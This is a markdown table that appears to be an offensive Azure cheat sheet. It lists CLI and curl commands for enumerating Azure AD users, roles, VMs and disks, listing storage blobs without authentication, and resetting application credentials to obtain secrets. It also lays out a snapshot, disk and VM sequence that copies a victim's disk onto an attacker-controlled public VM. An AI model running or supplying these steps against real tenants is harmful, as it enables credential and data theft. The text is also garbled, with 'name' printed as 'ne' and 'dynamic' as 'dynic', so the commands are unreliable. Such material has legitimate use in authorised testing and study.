
| Technique                                                    | Cmd                                                                                                                                                                                                                                                                              |
| ------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Azure CLI enumerate Az AD users                              | ```az ad user list -o table```                                                                                                                                                                                                                                                   |
| Enumerate az ad users by property                            | ```az ad user list --query '[].{Displayne:displayne,UserPrincipalne:userPrincipalne,UserType:userType}' -o table```                                                                                                                                                      |
| List azure ad role assignments                               | ```az role assignment list -o table```                                                                                                                                                                                                                                           |
| Get vm resources                                             | ```az vm list -o table --resource-group <rg ne>```                                                                                                                                                                                                                             |
| List specific fields for vms                                 | ```az vm list --query '[].{ne:ne,ResourceGroup:resourceGroup,ProvisioningState:provisioningState,VMSize:hardwareProfile.vmSize}' -o table --resource-group <rg ne>```                                                                                                      |
| List disk snapshots                                          | ```az snapshot list -o table```                                                                                                                                                                                                                                                  |
| List disks                                                   | ```az disk list -o table --resource-group <rg ne>```                                                                                                                                                                                                                           |
| List Files in Storage Blob unauthed                          | ```curl https://<storageaccountne>.blob.core.windows.net/<share>/?comp=list```                                                                                                                                                                                                 |
| Look for Applications in Azure AD                            | ```az ad app list --query "[?displayne=='Postman-API'].{AppId:appId}" -o table```                                                                                                                                                                                              |
| Pull application credentials                                 | ```az ad app credential reset --append --id <ID from above command>```                                                                                                                                                                                                           |
| Create snapshot of disk                                      | With storage explorer log in with account and create a snapshot (there has to be an API for this..)                                                                                                                                                                              |
| Get snapshot id                                              | ```snapId=$(az snapshot show --ne <whatever you ned snapshot in above step> --resource-group <resource group> --query [id] -o tsv)```                                                                                                                                        |
| Convert snapshot to a disk                                   | ```az disk create --resource-group <resource group> --ne <whatever disk ne> --sku Standard_LRS --size-gb 128 --source <snapshot ID from above>```                                                                                                                            |
| Create Ubuntu VM and mount snapshotted disk that was created | ```az vm create --ne <whatever ne of VM> --attach-data-disk <snapshot of disk ne after converting snapshot of disk> --admin-userne <whatever userne> --resource-group <resource group> --public-ip-address-allocation dynic --image ubuntults --generate-ssh-keys``` |
